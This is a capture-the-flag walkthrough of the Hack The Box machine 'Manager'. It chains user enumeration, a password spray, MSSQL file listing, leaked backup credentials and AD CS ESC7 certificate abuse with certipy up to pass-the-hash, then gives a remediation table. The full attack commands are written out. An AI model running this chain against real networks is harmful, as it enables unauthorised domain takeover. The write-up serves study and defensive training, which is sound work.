# Manager — MSSQL file read into an AD CS ESC7 takeover

[![Difficulty](https://img.shields.io/badge/difficulty-Medium-yellow)](https://app.hackthebox.com/machines/manager)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/manager)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=lT2Tv0m4k7M)

> **Attack path:** RID-cycling user enumeration → username-as-password spray (`operator:operator`) → MSSQL `xp_dirtree` reveals a web backup → cleartext `raven` credentials in `.old-conf.xml` → WinRM → **AD CS ESC7** (CA control) → Administrator certificate → NT hash via `certipy auth` → pass-the-hash.

A modern-medium AD box: quiet on the outside, but one weak password and one dangerous CA ACL later you own the domain — with certificates instead of DCSync.

## 1 · Reconnaissance

```bash
echo "10.10.11.236 manager.htb dc01.manager.htb" | sudo tee -a /etc/hosts

nmap -p- --min-rate 10000 -oN manager-allports 10.10.11.236
nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -sCV -oN manager-tcpsvc 10.10.11.236
```

A domain controller (`dc01.manager.htb`) that also runs **IIS (80)** and — unusually for a DC — **MSSQL (1433)**. The website itself is a static corporate page; content discovery finds nothing interesting.

### User enumeration via RID cycling

Anonymous RPC is enough to brute-force RIDs off the domain SID:

```bash
lookupsid.py -no-pass manager.htb/guest@dc01.manager.htb | grep "TypeUser"
# or:
netexec smb 10.10.11.236 -u guest -p '' --rid-brute | grep SidTypeUser
```

Domain users (excluding built-ins): `Zhong`, `Cheng`, `Ryan`, `Raven`, `JinWoo`, `ChinHae`, `Operator`.

## 2 · Foothold

### Password spray — username as password

With no roastable accounts, try the cheapest credential attack first:

```bash
netexec smb manager.htb -u users.txt -p users.txt --no-brute --continue-on-success
```

```text
[+] manager.htb\operator:operator
```

`operator` has no WinRM rights — but it does have a **SQL login**:

```bash
netexec mssql manager.htb -u operator -p operator
mssqlclient.py -windows-auth manager.htb/operator:operator@dc01.manager.htb
```

### MSSQL as a file browser

`xp_cmdshell` is denied, but **`xp_dirtree`** (a directory-listing extended procedure) still runs and doubles as a read primitive:

```sql
SQL> xp_dirtree C:\inetpub\wwwroot
```

```text
website-backup-27-07-23-old.zip   1   0
```

An old website backup sitting in the web root — and since it's under `wwwroot`, HTTP serves it directly:

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip -d web-backup
```

### Cleartext credentials in the backup

A hidden file inside the archive, `.old-conf.xml`, holds stale LDAP/application credentials:

```text
<userName>raven@manager.htb</userName>
<password>...</password>             → raven : <password>
```

## 3 · User flag

`raven` is a member of **Remote Management Users**:

```bash
netexec winrm manager.htb -u raven -p '<password>'
evil-winrm -i dc01.manager.htb -u raven -p '<password>'
```

```powershell
*Evil-WinRM* PS C:\> type C:\Users\Raven\Desktop\user.txt
<flag>
```

## 4 · Privilege escalation

### Find the AD CS misconfiguration

BloodHound shows no short path to Domain Admin — the edge lives in the certificate services instead:

```bash
certipy find -u raven@manager.htb -p '<password>' -dc-ip 10.10.11.236 -ns 10.10.11.236 \
  -vulnerable -stdout
```

`raven` holds **ManageCA** rights on `manager-DC01-CA` — the **ESC7** scenario (dangerous ACLs on the CA itself rather than a bad template).

### ESC7 — "attack 2": officer + SubCA template

Kerberos is time-sensitive, so sync first (`sudo ntpdate 10.10.11.236`), then run the four-step chain:

```bash
# 1. Make raven a Certificate Officer (can approve requests)
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p '<password>'

# 2. Request a cert for administrator via the SubCA template
#    (rejected for now — but certipy saves the private key + request ID)
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA \
  -upn administrator@manager.htb -username raven@manager.htb -p '<password>'

# 3. As officer, approve our own failed request (use the request ID from step 2)
certipy ca -ca manager-DC01-CA -issue-request <request-id> \
  -username raven@manager.htb -p '<password>'

# 4. Retrieve the now-issued certificate as a PFX
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve <request-id> \
  -username raven@manager.htb -p '<password>'
```

Result: `administrator.pfx` — a valid client-authentication certificate for the built-in Administrator.

## 5 · Root flag / Domain Admin

Let certipy exchange the PFX for the account's NT hash via Schannel/PKINIT:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
# Administrator hash: <hash>
```

Pass-the-hash to the DC:

```bash
evil-winrm -i dc01.manager.htb -u administrator -H <hash>
```

```powershell
*Evil-WinRM* PS C:\> type C:\Users\Administrator\Desktop\root.txt
<flag>
```

Encore: as Administrator you can DCSync the domain (`secretsdump.py -just-dc`) to pillage every account.

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| Username-as-password accepted for `operator` | Instant low-priv domain credentials via trivial spray | Block user-equals-password policy; breach-password screening; MFA on interactive logon |
| MSSQL login for a domain user with `xp_dirtree`/`xp_subdirs` enabled | Arbitrary file-tree disclosure leads to source/config leaks | Grant SQL logon only where needed; disable unneeded extended procedures (`xp_dirtree`, `xp_cmdshell`) for non-sysadmins |
| Website backup (with cleartext `raven` credentials) left in `wwwroot` | Anyone with the SQL file-read primitive (or HTTP, if listed) gets real user credentials | Never store backups/configs in web roots; scrub secrets from backups; rotate stale credentials |
| ESC7 — `ManageCA` granted to a regular user (`raven`) | Rogue certificate issuance as Administrator → full domain compromise | Restrict CA officer/manager roles to tier-0 admins; alert on `Certify`/certipy-style SubCA issuance patterns; run AD CS security audits (certipy find) |

## 7 · CPTS takeaways

- RID cycling (`lookupsid.py` / `netexec --rid-brute`) as the go-to anonymous user-enumeration technique when SMB listing is closed.
- Always spray `user=user` before reaching for heavier attacks — it wins more boxes than it should.
- **MSSQL post-auth enumeration**: `xp_dirtree` as a blind file-listing primitive even when `xp_cmdshell` is blocked — a recurring CPTS pattern.
- AD CS abuse beyond templates: **ESC7** with certipy's add-officer → SubCA request → issue → retrieve → `certipy auth` workflow is exam-relevant and rarely practiced elsewhere.
- Certificate-based escalation ends in pass-the-hash like everything else — the AD kill chain always converges on hashes.
